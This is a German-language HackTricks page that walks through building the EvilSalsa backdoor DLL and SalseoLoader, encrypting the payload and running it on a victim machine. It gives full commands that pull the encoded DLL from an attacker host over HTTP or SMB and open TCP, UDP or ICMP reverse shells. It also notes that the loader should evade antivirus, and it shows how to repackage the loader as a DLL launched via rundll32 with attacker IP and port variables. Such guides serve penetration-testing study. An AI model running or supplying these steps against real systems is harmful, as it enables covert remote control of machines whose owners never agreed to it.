# Salseo

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Kompilieren der Binaries

Lade den Quellcode von GitHub herunter und kompiliere **EvilSalsa** und **SalseoLoader**. Du benötigst **Visual Studio**, um den Code zu kompilieren.

Kompiliere diese Projekte für die Architektur des Windows-Systems, auf dem du sie verwenden möchtest (Wenn Windows x64 unterstützt, kompiliere sie für diese Architektur).

Du kannst **die Architektur auswählen** innerhalb von Visual Studio im **linken "Build"-Tab** unter **"Platform Target".**

(\*\*Wenn du diese Optionen nicht findest, klicke auf **"Project Tab"** und dann auf **"\<Projektname> Eigenschaften"**)

![](<../.gitbook/assets/image (839).png>)

Baue dann beide Projekte (Build -> Build Solution) (Im Protokoll wird der Pfad der ausführbaren Datei angezeigt):

![](<../.gitbook/assets/image (381).png>)

## Bereite das Backdoor vor

Zuerst musst du die **EvilSalsa.dll** kodieren. Dazu kannst du das Python-Skript **encrypterassembly.py** verwenden oder das Projekt **EncrypterAssembly** kompilieren:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, jetzt hast du alles, was du brauchst, um das gesamte Salseo-Ding auszuführen: die **kodierte EvilDalsa.dll** und die **Binärdatei von SalseoLoader.**

**Lade die SalseoLoader.exe-Binärdatei auf die Maschine hoch. Sie sollten von keinem AV erkannt werden...**

## **Führe die Hintertür aus**

### **Erhalte eine TCP-Reverse-Shell (kodierte DLL über HTTP herunterladen)**

Denke daran, eine nc als Reverse-Shell-Listener und einen HTTP-Server zu starten, um das kodierte evilsalsa bereitzustellen.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Einen UDP-Reverse-Shell erhalten (kodierte DLL über SMB herunterladen)**

Denken Sie daran, ein nc als Reverse-Shell-Listener zu starten und einen SMB-Server, um die kodierte evilsalsa bereitzustellen (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Einen ICMP Reverse Shell erhalten (kodierte DLL bereits im Opfer)**

**Diesmal benötigen Sie ein spezielles Tool auf dem Client, um den Reverse Shell zu empfangen. Laden Sie herunter:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP-Antworten deaktivieren:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Führen Sie den Client aus:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Im Inneren des Opfers, lassen Sie uns das salseo-Ding ausführen:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilieren von SalseoLoader als DLL, die die Hauptfunktion exportiert

Öffnen Sie das SalseoLoader-Projekt mit Visual Studio.

### Fügen Sie vor der Hauptfunktion hinzu: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Installieren Sie DllExport für dieses Projekt

#### **Tools** --> **NuGet-Paket-Manager** --> **NuGet-Pakete für die Lösung verwalten...**

![](<../.gitbook/assets/image (881).png>)

#### **Suchen Sie nach dem DllExport-Paket (unter Verwendung des Tabs Durchsuchen) und drücken Sie Installieren (und akzeptieren Sie das Popup)**

![](<../.gitbook/assets/image (100).png>)

In Ihrem Projektordner sind die Dateien erschienen: **DllExport.bat** und **DllExport\_Configure.bat**

### **De**installieren Sie DllExport

Drücken Sie **Deinstallieren** (ja, es ist seltsam, aber vertrauen Sie mir, es ist notwendig)

![](<../.gitbook/assets/image (97).png>)

### **Beenden Sie Visual Studio und führen Sie DllExport\_configure aus**

Beenden Sie einfach Visual Studio

Gehen Sie dann zu Ihrem **SalseoLoader-Ordner** und führen Sie **DllExport\_Configure.bat** aus

Wählen Sie **x64** (wenn Sie es in einer x64-Umgebung verwenden möchten, war das mein Fall), wählen Sie **System.Runtime.InteropServices** (innerhalb von **Namespace für DllExport**) und drücken Sie **Übernehmen**

![](<../.gitbook/assets/image (882).png>)

### **Öffnen Sie das Projekt erneut mit Visual Studio**

**\[DllExport]** sollte nicht länger als Fehler markiert sein

![](<../.gitbook/assets/image (670).png>)

### Erstellen Sie die Lösung

Wählen Sie **Ausgabetyp = Klassenbibliothek** (Projekt --> SalseoLoader-Eigenschaften --> Anwendung --> Ausgabetyp = Klassenbibliothek)

![](<../.gitbook/assets/image (847).png>)

Wählen Sie die **x64** **Plattform** (Projekt --> SalseoLoader-Eigenschaften --> Erstellen --> Plattformziel = x64)

![](<../.gitbook/assets/image (285).png>)

Um die Lösung zu **erstellen**: Erstellen --> Lösung erstellen (Im Ausgabekonsolenfenster wird der Pfad zur neuen DLL angezeigt)

### Testen Sie die generierte DLL

Kopieren Sie die DLL und fügen Sie sie dort ein, wo Sie sie testen möchten.

Führen Sie aus:
```
rundll32.exe SalseoLoader.dll,main
```
Wenn kein Fehler auftritt, haben Sie wahrscheinlich eine funktionale DLL!!

## Holen Sie sich eine Shell mit der DLL

Vergessen Sie nicht, einen **HTTP** **Server** zu verwenden und einen **nc** **Listener** einzurichten

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
